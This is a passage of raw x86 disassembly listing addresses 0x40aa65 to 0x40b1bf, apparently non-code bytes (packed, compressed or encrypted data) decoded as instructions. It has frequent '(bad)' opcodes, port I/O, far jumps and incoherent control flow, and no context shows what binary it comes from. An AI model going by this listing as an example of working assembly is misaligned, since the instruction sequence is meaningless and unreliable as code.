  40aa65:	adc    BYTE PTR [edi+0x77],bh
  40aa68:	ins    BYTE PTR es:[edi],dx
  40aa69:	ror    ebx,cl
  40aa6b:	inc    ecx
  40aa6c:	into   
  40aa6d:	shl    BYTE PTR [esi-0x77],1
  40aa70:	loop   0x40aa1e
  40aa72:	mov    ecx,0xd7a76a73
  40aa77:	mov    ch,0xd7
  40aa79:	push   ss
  40aa7a:	loope  0x40aa92
  40aa7c:	fbld   TBYTE PTR [esi]
  40aa7e:	sub    BYTE PTR [eax+ebx*2-0x3e],0xcd
  40aa83:	jle    0x40aa10
  40aa85:	mov    cl,0xbe
  40aa87:	jle    0x40aafa
  40aa89:	mov    di,0xb25a
  40aa8d:	xchg   edx,eax
  40aa8e:	out    0x44,al
  40aa90:	dec    DWORD PTR [esi+0x25d85ea7]
  40aa96:	adc    al,0xe0
  40aa98:	popa   
  40aa99:	out    0x75,al
  40aa9b:	xchg   BYTE PTR [edi-0x73],bl
  40aa9e:	and    eax,DWORD PTR [esi]
  40aaa0:	cmp    eax,0x3780bad4
  40aaa5:	push   ss
  40aaa6:	xchg   edx,eax
  40aaa7:	pop    es
  40aaa8:	std    
  40aaa9:	inc    edx
  40aaaa:	cld    
  40aaab:	and    BYTE PTR [ecx+0x46],ch
  40aaae:	jae    0x40ab29
  40aab0:	or     al,BYTE PTR [eax+0x6af2c696]
  40aab6:	lock les ebp,FWORD PTR [eax+0x5]
  40aaba:	sbb    BYTE PTR [ebx-0x32],bh
  40aabd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aabe:	(bad)  
  40aabf:	nop
  40aac0:	and    eax,0x672477a8
  40aac5:	jle    0x40aae9
  40aac7:	cld    
  40aac8:	cs pop ss
  40aaca:	cmp    ah,BYTE PTR [eax-0x72]
  40aacd:	jno    0x40aafc
  40aacf:	mov    ds:0x89a2a64d,eax
  40aad4:	scas   eax,DWORD PTR es:[edi]
  40aad5:	cmovl  esi,DWORD PTR [edx-0x2d]
  40aad9:	scas   eax,DWORD PTR es:[edi]
  40aada:	and    eax,0x7caf8177
  40aadf:	cld    
  40aae0:	pop    ss
  40aae1:	inc    eax
  40aae2:	mov    ecx,0x8afa5589
  40aae7:	sub    al,0x13
  40aae9:	loop   0x40aa9d
  40aaeb:	pusha  
  40aaec:	mov    edx,0xdc332bbb
  40aaf1:	retf   
  40aaf2:	push   0x98573d4d
  40aaf7:	cmp    al,0x4f
  40aaf9:	push   edx
  40aafa:	sbb    eax,0x9ae0d4f0
  40aaff:	push   edx
  40ab00:	stc    
  40ab01:	in     eax,0x34
  40ab03:	scas   al,BYTE PTR es:[edi]
  40ab04:	mov    eax,ds:0x89f2a164
  40ab09:	xor    edx,DWORD PTR [esi+0x30]
  40ab0c:	mov    eax,ds:0xa3fc3ae
  40ab11:	imul   ecx,DWORD PTR [ecx-0x5104a925],0x1f
  40ab18:	fidiv  DWORD PTR [eax-0x5d]
  40ab1b:	jno    0x40aacc
  40ab1d:	jae    0x40ab45
  40ab1f:	fbstp  TBYTE PTR [ebx+0x2d]
  40ab22:	mov    es,WORD PTR [esi+0x7f913b40]
  40ab28:	int3   
  40ab29:	dec    edx
  40ab2a:	inc    esi
  40ab2b:	sbb    cl,BYTE PTR [edi-0x78]
  40ab2e:	icebp  
  40ab2f:	xor    al,0x17
  40ab31:	xchg   edi,eax
  40ab32:	sub    BYTE PTR [esi+0x47],ah
  40ab35:	cs not DWORD PTR ss:[edi]
  40ab39:	cmp    BYTE PTR [edx+0xd],dh
  40ab3c:	dec    eax
  40ab3d:	inc    ebx
  40ab3e:	jb     0x40ab5d
  40ab40:	stos   BYTE PTR es:[edi],al
  40ab41:	jmp    0x838b8609
  40ab46:	adc    ah,cl
  40ab48:	mov    ds:0xad972974,eax
  40ab4d:	adc    eax,0x957976ad
  40ab52:	pop    ebp
  40ab53:	push   edi
  40ab54:	push   ebp
  40ab55:	mov    esp,0xf14d80fb
  40ab5a:	adc    DWORD PTR [ebp+0x5105d749],ebp
  40ab60:	pop    ds
  40ab61:	ret    
  40ab62:	mov    ds:0x2b29c576,eax
  40ab67:	pop    ss
  40ab68:	js     0x40ab2b
  40ab6a:	and    al,0x86
  40ab6c:	adc    DWORD PTR [edi],esp
  40ab6e:	and    BYTE PTR [esi-0x30],0x73
  40ab72:	adc    dl,BYTE PTR [edx+0x34]
  40ab75:	pop    esi
  40ab76:	ds in  al,0xe1
  40ab79:	jb     0x40ab50
  40ab7b:	adc    edi,DWORD PTR [ecx+ebx*2+0x2c]
  40ab7f:	iret   
  40ab80:	in     al,dx
  40ab81:	iret   
  40ab82:	mov    esp,0xf234a080
  40ab87:	adc    dh,BYTE PTR [ebx+esi*2]
  40ab8a:	sbb    ch,BYTE PTR [ecx-0x532960a6]
  40ab90:	sub    dh,BYTE PTR [edi+0x52]
  40ab93:	dec    ebp
  40ab94:	mov    dh,0xd6
  40ab96:	outs   dx,BYTE PTR ds:[esi]
  40ab97:	(bad)  
  40ab98:	sub    BYTE PTR [edi+0x4eff77d5],bl
  40ab9e:	int    0xd5
  40aba0:	mov    eax,ds:0x8951bd53
  40aba5:	mov    BYTE PTR [ecx+0x9562f1c],bl
  40abab:	popa   
  40abac:	sbb    dl,0xed
  40abaf:	dec    esi
  40abb0:	aam    0xfb
  40abb2:	out    0xf1,eax
  40abb4:	cmp    DWORD PTR [ebx],ebx
  40abb6:	out    0x8e,al
  40abb8:	push   0x6a
  40abba:	fwait
  40abbb:	cmp    ebp,DWORD PTR [ecx+esi*4-0x3704a73a]
  40abc2:	push   esp
  40abc3:	and    ah,BYTE PTR [ebp+0x26ccfa9d]
  40abc9:	xor    DWORD PTR [ecx+ebp*1-0x24],0x5f
  40abce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abcf:	jnp    0x40ac3c
  40abd1:	jbe    0x40abfd
  40abd3:	add    ah,dh
  40abd5:	xchg   edi,eax
  40abd6:	jg     0x40abce
  40abd8:	mov    edx,0x450e9122
  40abdd:	imul   ebx,DWORD PTR [ebp-0x4b],0xffffffc1
  40abe1:	mov    edx,0x3661c81e
  40abe6:	push   edx
  40abe7:	adc    al,0x82
  40abe9:	mov    eax,0xd9b3ba6e
  40abee:	loop   0x40ac24
  40abf0:	xor    eax,DWORD PTR [eax-0x5d31510d]
  40abf6:	jp     0x40ac42
  40abf8:	pop    ebx
  40abf9:	leave  
  40abfa:	jp     0x40ac27
  40abfc:	xchg   ebx,eax
  40abfd:	adc    DWORD PTR [ebp+0x76],edi
  40ac00:	or     DWORD PTR [ecx-0x437799f0],eax
  40ac06:	mov    edi,0x7ff5be9c
  40ac0b:	fild   WORD PTR [esi]
  40ac0d:	inc    ebp
  40ac0e:	push   esp
  40ac0f:	lea    esi,[eax]
  40ac11:	in     eax,dx
  40ac12:	call   ebx
  40ac14:	ds pop ecx
  40ac16:	lock mov ch,0x99
  40ac19:	xor    DWORD PTR [eax+0xa8e6169],ecx
  40ac1f:	mov    WORD PTR [eax],fs
  40ac21:	mov    ecx,0xdc699f76
  40ac26:	(bad)  
  40ac27:	jl     0x40ac14
  40ac29:	push   ds
  40ac2a:	cmp    BYTE PTR [ebp+edx*1+0x4eacc417],bh
  40ac31:	sbb    eax,0x8474ed33
  40ac36:	retf   
  40ac37:	pop    esp
  40ac38:	sbb    DWORD PTR [edx-0x57],esp
  40ac3b:	scas   eax,DWORD PTR es:[edi]
  40ac3c:	cmc    
  40ac3d:	xor    ch,ch
  40ac3f:	and    eax,0xe5ff8dc5
  40ac44:	inc    edi
  40ac45:	jp     0x40ac8b
  40ac47:	xchg   ebp,eax
  40ac48:	cli    
  40ac49:	push   ds
  40ac4a:	cmp    bl,BYTE PTR [edx-0x4a870c72]
  40ac50:	push   ds
  40ac51:	or     cl,dh
  40ac53:	jns    0x40ac93
  40ac55:	jo     0x40ac4f
  40ac57:	or     dh,BYTE PTR [esi]
  40ac59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac5a:	mov    dh,0x11
  40ac5c:	sub    BYTE PTR [eax-0x2265724],dh
  40ac62:	shl    DWORD PTR [ebx],1
  40ac64:	stos   DWORD PTR es:[edi],eax
  40ac65:	add    esi,esi
  40ac67:	out    dx,al
  40ac68:	lds    ebp,FWORD PTR [edx+edi*2-0x359f249d]
  40ac6f:	jl     0x40ac06
  40ac71:	mov    cl,bl
  40ac73:	dec    esi
  40ac74:	push   ds
  40ac75:	fwait
  40ac76:	cmp    eax,0xaff204ab
  40ac7b:	sti    
  40ac7c:	xlat   BYTE PTR ds:[ebx]
  40ac7d:	jbe    0x40acc4
  40ac7f:	mov    DWORD PTR [ebx-0xbbdc407],edi
  40ac85:	rcl    BYTE PTR [ebx-0x26],0xa1
  40ac89:	aas    
  40ac8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac8b:	xchg   ebp,eax
  40ac8c:	cs mov edx,0x317964ca
  40ac92:	in     eax,dx
  40ac93:	sbb    eax,0x9cc0c2a1
  40ac98:	into   
  40ac99:	mov    ch,0xbd
  40ac9b:	(bad)  
  40ac9c:	in     eax,dx
  40ac9d:	js     0x40ac7d
  40ac9f:	push   esp
  40aca0:	xor    bl,BYTE PTR [ecx-0x67651010]
  40aca6:	push   esi
  40aca7:	and    edi,0xffffffdb
  40acaa:	push   edi
  40acab:	or     dh,BYTE PTR [esi-0x17]
  40acae:	mov    eax,ds:0x560a5aba
  40acb3:	pushf  
  40acb4:	add    DWORD PTR [ebx-0x5a],esi
  40acb7:	in     eax,dx
  40acb8:	imul   esp,DWORD PTR [edi],0xc5771668
  40acbe:	sbb    DWORD PTR [edi-0x52],ecx
  40acc1:	lahf   
  40acc2:	not    ah
  40acc4:	(bad)  
  40acc5:	gs leave 
  40acc7:	cmp    dh,ah
  40acc9:	sti    
  40acca:	adc    dl,ah
  40accc:	mov    ebx,0xe7394f23
  40acd1:	pushf  
  40acd2:	push   ss
  40acd3:	or     dh,cl
  40acd5:	sub    DWORD PTR [ecx+0x320ffc89],0xd5a908f0
  40acdf:	mov    DWORD PTR [ecx-0x30],edx
  40ace2:	outs   dx,BYTE PTR ds:[esi]
  40ace3:	cmp    DWORD PTR [ebx],esi
  40ace5:	lods   eax,DWORD PTR ds:[esi]
  40ace6:	icebp  
  40ace7:	call   0xe8ae:0xc8c2d29c
  40acee:	outs   dx,DWORD PTR ds:[esi]
  40acef:	(bad)  
  40acf0:	jmp    0x40ad63
  40acf2:	pop    ebp
  40acf3:	inc    ebx
  40acf4:	fs aad 0x3b
  40acf7:	jns    0x40ace0
  40acf9:	mov    cl,0xff
  40acfb:	test   DWORD PTR [esi+0x7a7d798f],ecx
  40ad01:	mov    eax,0x6329d773
  40ad06:	cmp    eax,0xbae6e2c1
  40ad0b:	in     al,dx
  40ad0c:	and    BYTE PTR [edx],al
  40ad0e:	fisubr DWORD PTR [esi]
  40ad10:	out    0x54,eax
  40ad12:	cli    
  40ad13:	inc    esi
  40ad14:	mov    ebp,0xbfac787c
  40ad19:	sbb    al,0xd3
  40ad1b:	retf   
  40ad1c:	imul   ebx,DWORD PTR ds:0x3d2c1d75,0x28888a58
  40ad26:	sbb    eax,0xa16e79fe
  40ad2b:	add    al,0x86
  40ad2d:	cmp    BYTE PTR [ebp-0x3e],ch
  40ad30:	or     eax,0xece6fb6c
  40ad35:	mov    dl,0x11
  40ad37:	inc    DWORD PTR [ebx-0xa]
  40ad3a:	jecxz  0x40ad8a
  40ad3c:	xor    al,BYTE PTR [ecx]
  40ad3e:	xchg   ebp,eax
  40ad3f:	call   0x6079246f
  40ad44:	pop    ds
  40ad45:	or     DWORD PTR [edx+0x60],edx
  40ad48:	test   eax,ebp
  40ad4a:	ret    0x3de1
  40ad4d:	lock add DWORD PTR [esi*8+0x3a1811d1],edx
  40ad55:	add    ebp,DWORD PTR [eax+0x29828ffe]
  40ad5b:	pop    eax
  40ad5c:	sahf   
  40ad5d:	daa    
  40ad5e:	int    0x5e
  40ad60:	sbb    DWORD PTR [edx-0xa],0xc57350b
  40ad67:	xchg   edi,eax
  40ad68:	lds    ebx,FWORD PTR [ebx-0x7e6d6873]
  40ad6e:	and    edi,DWORD PTR [edx]
  40ad70:	add    edi,edx
  40ad72:	or     DWORD PTR [esi],esi
  40ad74:	repz inc edx
  40ad76:	arpl   ax,dx
  40ad78:	call   0x8fe9dfce
  40ad7d:	and    DWORD PTR [ebx],ebp
  40ad7f:	daa    
  40ad80:	mov    al,0xa1
  40ad82:	lahf   
  40ad83:	mov    edx,0x87d40027
  40ad88:	test   BYTE PTR [ecx-0x5],dl
  40ad8b:	(bad)  
  40ad8c:	in     al,dx
  40ad8d:	das    
  40ad8e:	test   eax,esp
  40ad90:	and    ecx,DWORD PTR [ebx]
  40ad92:	jp     0x40ad60
  40ad94:	test   eax,0xa53ede7f
  40ad99:	repnz dec edx
  40ad9b:	jle    0x40ad86
  40ad9d:	push   ebx
  40ad9e:	mov    ecx,0x638ad1d5
  40ada3:	adc    ah,BYTE PTR [eax]
  40ada5:	sahf   
  40ada6:	xor    eax,0xc5c8367e
  40adab:	loop   0x40adec
  40adad:	(bad)
  40adb1:	cdq    
  40adb2:	test   ch,dh
  40adb4:	icebp  
  40adb5:	jae    0x40ad9f
  40adb7:	(bad)  [ecx-0x6c]
  40adba:	sub    al,0x6c
  40adbc:	sub    eax,0x736a89eb
  40adc1:	cmp    edx,0x4e
  40adc4:	gs stos BYTE PTR es:[edi],al
  40adc6:	neg    BYTE PTR [edx+0x6e2639b0]
  40adcc:	pop    esp
  40adcd:	hlt    
  40adce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adcf:	push   edx
  40add0:	shl    DWORD PTR [ebx],cl
  40add2:	jno    0x40adfc
  40add4:	xor    al,0xce
  40add6:	or     BYTE PTR [edi+0x5c],bl
  40add9:	imul   ecx,edi,0x8c745fe2
  40addf:	scas   eax,DWORD PTR es:[edi]
  40ade0:	adc    DWORD PTR [ebx],0xffffffce
  40ade3:	(bad)  
  40ade4:	pop    esp
  40ade5:	aaa    
  40ade6:	test   eax,0xf35c8e0f
  40adeb:	push   edi
  40adec:	jae    0x40ae09
  40adee:	iret   
  40adef:	dec    edx
  40adf0:	call   0x7251b15b
  40adf5:	mov    fs:0xd01f8232,eax
  40adfb:	xor    al,0xac
  40adfd:	or     dh,bl
  40adff:	mov    eax,DWORD PTR [ecx+esi*4]
  40ae02:	cli    
  40ae03:	or     BYTE PTR [edi-0x4796df9c],dh
  40ae09:	shl    DWORD PTR [edx],1
  40ae0b:	out    0xbe,al
  40ae0d:	sub    DWORD PTR [ebx-0x23],esi
  40ae10:	xchg   ebx,eax
  40ae11:	stos   DWORD PTR es:[edi],eax
  40ae12:	xchg   edi,eax
  40ae13:	add    eax,0x93540d83
  40ae18:	clc    
  40ae19:	xlat   BYTE PTR ds:[ebx]
  40ae1a:	ja     0x40ae8b
  40ae1c:	out    dx,eax
  40ae1d:	mov    dh,0x2
  40ae1f:	sbb    esp,DWORD PTR ds:0x6880684b
  40ae25:	retf   0xb9bd
  40ae28:	mov    edx,0xe216cc3b
  40ae2d:	scas   eax,DWORD PTR es:[edi]
  40ae2e:	iret   
  40ae2f:	sub    DWORD PTR [esp+ebp*4-0x1f],ebp
  40ae33:	rol    edi,0xf8
  40ae36:	mov    ds:0xd84fd3b1,eax
  40ae3b:	rcl    eax,cl
  40ae3d:	xchg   ebp,eax
  40ae3e:	pop    edx
  40ae3f:	jne    0x40adcf
  40ae41:	adc    eax,0x74640b57
  40ae46:	dec    edi
  40ae47:	shl    DWORD PTR [ecx],cl
  40ae49:	push   ebx
  40ae4a:	jmp    0x68ce:0xcebc2714
  40ae51:	cmc    
  40ae52:	fwait
  40ae53:	dec    ebx
  40ae54:	into   
  40ae55:	(bad)  
  40ae57:	pop    ebp
  40ae58:	fwait
  40ae59:	xchg   esp,eax
  40ae5a:	adc    DWORD PTR [ecx],eax
  40ae5c:	mov    ah,0x5f
  40ae5e:	std    
  40ae5f:	mov    al,ds:0x9649f0b3
  40ae64:	(bad)  
  40ae65:	ins    DWORD PTR es:[edi],dx
  40ae66:	adc    BYTE PTR [edx-0xa51f05b],al
  40ae6c:	push   esp
  40ae6d:	add    DWORD PTR [edx],edi
  40ae6f:	leave  
  40ae70:	xchg   BYTE PTR [ebp*1+0x38a4b360],al
  40ae77:	ret    0x1cdd
  40ae7a:	cdq    
  40ae7b:	or     ecx,ecx
  40ae7d:	sar    BYTE PTR cs:[edi+0x35],1
  40ae81:	jno    0x40aeb4
  40ae83:	pop    ebx
  40ae84:	ret    
  40ae85:	jp     0x40ae7f
  40ae87:	sub    edi,0x1e2272a7
  40ae8d:	jg     0x40ae61
  40ae8f:	mov    bl,0x15
  40ae91:	pop    edi
  40ae92:	xchg   ebp,eax
  40ae93:	call   0xaec0257
  40ae98:	push   eax
  40ae99:	xchg   ebp,eax
  40ae9a:	cmp    edx,DWORD PTR [ebp-0x2a8ec856]
  40aea0:	mov    ah,0x18
  40aea2:	jb     0x40ae33
  40aea4:	mov    edx,0x87cb7d7
  40aea9:	mov    BYTE PTR [ebp-0x76],dh
  40aeac:	repnz call 0xb09d:0xc213a3ba
  40aeb4:	sbb    BYTE PTR [ebx+0x1ad42b80],dh
  40aeba:	cmp    DWORD PTR [edx+0x12],ebp
  40aebd:	or     BYTE PTR [edi-0x1674dd4c],dh
  40aec3:	iret   
  40aec4:	lods   eax,DWORD PTR ds:[esi]
  40aec5:	jae    0x40af2a
  40aec7:	add    BYTE PTR ds:0xde4ca443,al
  40aecd:	push   edx
  40aece:	lods   al,BYTE PTR ds:[esi]
  40aecf:	cwde   
  40aed0:	sbb    ebx,DWORD PTR ds:0xa2f96aaf
  40aed6:	mov    ah,0x37
  40aed8:	inc    esp
  40aed9:	pusha  
  40aeda:	and    BYTE PTR [ecx+0x66],al
  40aedd:	leave  
  40aede:	loopne 0x40af26
  40aee0:	lea    ebx,[edi-0x15]
  40aee3:	xor    edi,DWORD PTR [edx-0xb]
  40aee6:	pop    ss
  40aee7:	das    
  40aee8:	xor    al,0x17
  40aeea:	mov    cl,0x8f
  40aeec:	fwait
  40aeed:	xchg   DWORD PTR [ebx],ebp
  40aeef:	pop    edi
  40aef0:	(bad)  
  40aef1:	pop    ebx
  40aef2:	dec    ebx
  40aef3:	inc    eax
  40aef4:	xor    dl,BYTE PTR [ebx]
  40aef6:	test   DWORD PTR [esi+0x461589c5],edx
  40aefc:	pop    esi
  40aefd:	mov    al,ds:0x485d2aff
  40af02:	int3   
  40af03:	mov    fs,WORD PTR [ecx]
  40af05:	dec    ebx
  40af06:	fsubr  QWORD PTR [ebx]
  40af08:	(bad)  
  40af09:	out    dx,al
  40af0a:	cwde   
  40af0b:	lods   al,BYTE PTR ds:[esi]
  40af0c:	addr16 mov dl,0xb5
  40af0f:	popa   
  40af10:	mov    BYTE PTR [edx-0x2e],ch
  40af13:	or     BYTE PTR [ecx+0x44f8475b],dh
  40af19:	das    
  40af1a:	mov    esi,0xbe4fb4a
  40af1f:	inc    ecx
  40af20:	jne    0x40af22
  40af22:	and    DWORD PTR [ebx+0x26],edx
  40af25:	(bad)  
  40af28:	inc    BYTE PTR [ebx-0x7d]
  40af2b:	(bad)  
  40af2c:	std    
  40af2d:	push   ecx
  40af2e:	ins    BYTE PTR es:[edi],dx
  40af2f:	xchg   ebx,eax
  40af30:	sub    eax,0x7e09d167
  40af35:	bound  esi,QWORD PTR [edx]
  40af37:	xor    bl,BYTE PTR [eax]
  40af39:	mov    cl,0xb4
  40af3b:	lahf   
  40af3c:	push   0x6d429786
  40af41:	jo     0x40afb8
  40af43:	cld    
  40af44:	js     0x40aede
  40af46:	cmp    edi,DWORD PTR [edx+0x58773334]
  40af4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af4d:	or     BYTE PTR [edx-0x6c],dl
  40af50:	dec    eax
  40af51:	outs   dx,BYTE PTR ds:[esi]
  40af52:	sbb    BYTE PTR [edx+0x49f5f6d8],al
  40af58:	std    
  40af59:	add    ecx,ebx
  40af5b:	call   0x4f13:0xc52f8571
  40af62:	repnz xor al,BYTE PTR [ecx+0x1879039f]
  40af69:	sub    BYTE PTR [ebp-0x2c],ch
  40af6c:	push   esp
  40af6d:	fstp   DWORD PTR [esi-0x38]
  40af70:	repz mov bl,0xfb
  40af73:	leave  
  40af74:	mov    fs,WORD PTR [edi+0x5a]
  40af77:	test   al,0x74
  40af79:	inc    ebx
  40af7a:	sub    al,0xcd
  40af7c:	sub    ebp,ebp
  40af7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af7f:	add    eax,0x9b823d13
  40af84:	test   eax,0xdacdeb62
  40af89:	pop    edx
  40af8a:	std    
  40af8b:	inc    esi
  40af8c:	mov    ebx,0x5fcae694
  40af91:	xchg   esp,eax
  40af92:	scas   al,BYTE PTR es:[edi]
  40af93:	xchg   bh,ah
  40af95:	mov    bl,0x37
  40af97:	mov    ah,0x87
  40af99:	inc    ebx
  40af9a:	mov    al,0xcf
  40af9c:	pop    esi
  40af9d:	jno    0x40afc9
  40af9f:	sar    BYTE PTR [edi-0x2549d0a7],1
  40afa5:	xor    al,0xbe
  40afa7:	aas    
  40afa8:	loop   0x40afc8
  40afaa:	xor    BYTE PTR [edi+ebp*1],bl
  40afad:	add    DWORD PTR [ecx+0xddd04c3],0xffffff84
  40afb4:	pop    ebp
  40afb5:	sub    edi,DWORD PTR [edx+eiz*4+0x44bf325c]
  40afbc:	jl     0x40afa8
  40afbe:	jb     0x40b031
  40afc0:	(bad)  
  40afc1:	mov    ecx,0xdfcac27d
  40afc6:	mov    ds:0xfdc421be,eax
  40afcc:	and    dl,BYTE PTR [ecx]
  40afce:	adc    al,0x90
  40afd0:	aam    0x42
  40afd2:	dec    esi
  40afd3:	mov    eax,ds:0x360cffee
  40afd8:	xor    bh,BYTE PTR [edi-0x4b0f668e]
  40afde:	push   ebp
  40afdf:	mov    esi,0x5daa9dac
  40afe4:	cmp    al,dh
  40afe6:	(bad)  
  40afe7:	or     DWORD PTR [ebx+0x59],esp
  40afea:	rol    BYTE PTR [edx+ebp*8],1
  40afed:	adc    dh,bh
  40afef:	test   BYTE PTR [ecx+0x7d],ah
  40aff2:	push   eax
  40aff3:	outs   dx,BYTE PTR ds:[esi]
  40aff4:	dec    esp
  40aff5:	stos   DWORD PTR es:[edi],eax
  40aff6:	or     ebx,DWORD PTR [esi]
  40aff8:	xchg   edi,eax
  40aff9:	out    dx,eax
  40affa:	(bad)  [ecx-0x1a628ece]
  40b000:	cmp    eax,ebx
  40b002:	dec    ah
  40b004:	mov    cl,0x7b
  40b006:	scas   eax,DWORD PTR es:[edi]
  40b007:	xor    eax,0xb46bb32f
  40b00c:	out    0x32,al
  40b00e:	push   ecx
  40b00f:	bound  edx,QWORD PTR [ecx-0x6a]
  40b012:	test   eax,0x4d7cd9c9
  40b017:	sub    dl,BYTE PTR [edi]
  40b019:	pop    edi
  40b01a:	mov    eax,0x9c124822
  40b01f:	adc    DWORD PTR [ebx],ebp
  40b021:	das    
  40b022:	sbb    dl,BYTE PTR [edi+0x192516a7]
  40b028:	inc    esp
  40b029:	ficomp DWORD PTR [ebx+0x37]
  40b02c:	xchg   ebx,eax
  40b02d:	and    eax,0x84898893
  40b032:	push   ebp
  40b033:	dec    DWORD PTR [ebx+0x3f]
  40b036:	stos   DWORD PTR es:[edi],eax
  40b037:	call   DWORD PTR [ecx+0x19]
  40b03a:	jp     0x40afd7
  40b03c:	in     eax,dx
  40b03d:	fwait
  40b03e:	or     BYTE PTR [bp+di-0x38c3],cl
  40b043:	and    DWORD PTR [eax+0x137928db],esi
  40b049:	adc    ebx,DWORD PTR [ebx+ebp*1]
  40b04c:	pop    esi
  40b04d:	ret    
  40b04e:	dec    edx
  40b04f:	cs jmp 0xcd9e:0x93577714
  40b057:	mov    ds:0x59d9e3c4,eax
  40b05c:	xchg   esi,eax
  40b05d:	leave  
  40b05e:	pop    si
  40b060:	cmp    eax,0xbd90aaa9
  40b065:	xor    eax,0xd69d8e37
  40b06a:	loope  0x40b0d6
  40b06c:	popa   
  40b06d:	mov    al,0x13
  40b06f:	les    esp,FWORD PTR [ecx+0xd]
  40b072:	xchg   edx,eax
  40b073:	aad    0x87
  40b075:	fbld   TBYTE PTR [edx-0x3c798f5e]
  40b07b:	das    
  40b07c:	adc    dh,ch
  40b07e:	push   DWORD PTR [edi]
  40b080:	pusha  
  40b081:	imul   ebp,DWORD PTR [ecx-0x25],0x74
  40b085:	dec    esp
  40b086:	and    cl,BYTE PTR [eax]
  40b088:	hlt    
  40b089:	ror    DWORD PTR [ebx+0x69],1
  40b08c:	mov    gs,WORD PTR [ebx]
  40b08e:	mov    al,0x9d
  40b090:	mov    ch,0xab
  40b092:	xor    sp,bp
  40b095:	push   cs
  40b096:	dec    edi
  40b097:	cld    
  40b098:	inc    ecx
  40b099:	mov    eax,0xc372e565
  40b09e:	mov    bh,0xbc
  40b0a1:	jne    0x40b058
  40b0a3:	lock test eax,0xe510f8f9
  40b0a9:	int    0xca
  40b0ab:	fmul   QWORD PTR [ebx-0x2297b96e]
  40b0b1:	dec    esp
  40b0b2:	sub    al,0x7c
  40b0b4:	stc    
  40b0b5:	mov    dh,0x8f
  40b0b7:	rcl    DWORD PTR [esi],0xb5
  40b0ba:	in     eax,0xcf
  40b0bc:	out    dx,al
  40b0bd:	(bad)  
  40b0be:	div    edi
  40b0c0:	ds aam 0x37
  40b0c3:	adc    DWORD PTR [ebx-0x7a],ebx
  40b0c6:	and    ch,BYTE PTR [edx+0x715947f9]
  40b0cc:	cwde   
  40b0cd:	inc    eax
  40b0ce:	add    BYTE PTR [edx+0x7a7ebb81],bl
  40b0d4:	test   BYTE PTR [eax+0x23],dl
  40b0d7:	mov    ch,BYTE PTR [esi]
  40b0d9:	xchg   BYTE PTR [eax+0x66],dh
  40b0dc:	fistp  QWORD PTR [edx]
  40b0de:	and    ch,BYTE PTR [ecx+0x53]
  40b0e1:	adc    BYTE PTR [eax-0x60c35cf7],bl
  40b0e7:	bsf    ebx,DWORD PTR [eax]
  40b0ea:	imul   ebx,edx,0x1c73eafa
  40b0f0:	or     al,0x14
  40b0f2:	mov    WORD PTR [edx],?
  40b0f4:	fild   QWORD PTR [eax-0x38c2ba1e]
  40b0fa:	push   edi
  40b0fb:	aaa    
  40b0fc:	jecxz  0x40b0c9
  40b0fe:	cmp    BYTE PTR gs:[ebp-0x5e],dl
  40b102:	add    al,0x1b
  40b104:	xor    BYTE PTR [edx+0x6c],0xe5
  40b108:	sub    eax,0x305b6af6
  40b10d:	lods   al,BYTE PTR ds:[esi]
  40b10e:	mov    DWORD PTR [ecx+0x32],0x96ef9288
  40b115:	bound  edx,QWORD PTR [eax]
  40b117:	mov    ss,ebx
  40b119:	push   ss
  40b11a:	inc    edx
  40b11b:	lock pop ebp
  40b11d:	rol    DWORD PTR [ebx-0x7e],1
  40b120:	pop    esi
  40b121:	xchg   ecx,eax
  40b122:	push   ds
  40b123:	aam    0x9f
  40b125:	cdq    
  40b126:	sbb    al,0x26
  40b128:	sub    bh,0xd7
  40b12b:	and    al,0x5c
  40b12d:	xlat   BYTE PTR ds:[ebx]
  40b12e:	retf   0x97bc
  40b131:	enter  0x92ea,0x71
  40b135:	scas   eax,DWORD PTR es:[edi]
  40b136:	sahf   
  40b137:	xor    DWORD PTR [eax-0x71463ea1],esi
  40b13d:	lar    edi,WORD PTR [ecx-0x51]
  40b141:	and    BYTE PTR [ebx+ebp*8-0x368e7991],al
  40b148:	cmp    BYTE PTR [ebx-0x706220cd],0x21
  40b14f:	push   eax
  40b150:	adc    eax,0xf5e1c2cd
  40b155:	jl     0x40b136
  40b157:	inc    ebp
  40b158:	adc    ah,0x38
  40b15b:	(bad)  
  40b15c:	pop    esi
  40b15d:	rol    BYTE PTR [esi+0x27],1
  40b160:	frstor [edi+ecx*2]
  40b163:	lds    ecx,FWORD PTR [ecx-0x3d]
  40b166:	push   ebp
  40b167:	dec    ebp
  40b168:	popa   
  40b169:	or     ebx,DWORD PTR [esp+edx*2+0x5f]
  40b16d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b16e:	add    DWORD PTR [ebx-0x2b17a0f6],esp
  40b174:	mov    edx,DWORD PTR [eax+0x74]
  40b177:	out    dx,eax
  40b178:	push   esp
  40b179:	pop    ds
  40b17a:	shr    BYTE PTR [eax],1
  40b17c:	push   0x3b
  40b17e:	aas    
  40b17f:	sub    eax,0x2847e881
  40b184:	sub    al,0xce
  40b186:	adc    esp,DWORD PTR [esi+0x6c]
  40b189:	jp     0x40b12c
  40b18b:	scas   al,BYTE PTR es:[edi]
  40b18c:	icebp  
  40b18d:	push   edi
  40b18e:	inc    ecx
  40b18f:	outs   dx,BYTE PTR ds:[esi]
  40b190:	sar    DWORD PTR [ecx],cl
  40b192:	push   esp
  40b193:	mov    bl,0xc2
  40b195:	mov    ecx,0xe1fca64e
  40b19a:	mov    dl,0xee
  40b19c:	xor    dh,BYTE PTR [ebx]
  40b19e:	stc    
  40b19f:	jbe    0x40b182
  40b1a1:	mov    WORD PTR [ebp+0x16],?
  40b1a4:	es xchg ebx,eax
  40b1a6:	aaa    
  40b1a7:	mov    ds:0x5a7346f8,eax
  40b1ac:	xchg   ecx,eax
  40b1ad:	mov    dl,0xfa
  40b1af:	mov    cl,0x19
  40b1b1:	xor    ebp,DWORD PTR [ebx]
  40b1b3:	mov    ds:0xde1ac82e,eax
  40b1b8:	pop    ebx
  40b1b9:	xchg   esi,eax
  40b1ba:	cld    
  40b1bb:	cld    
  40b1bc:	jno    0x40b1dd
  40b1be:	(bad)  
  40b1bf:	call   0x53cbf21f
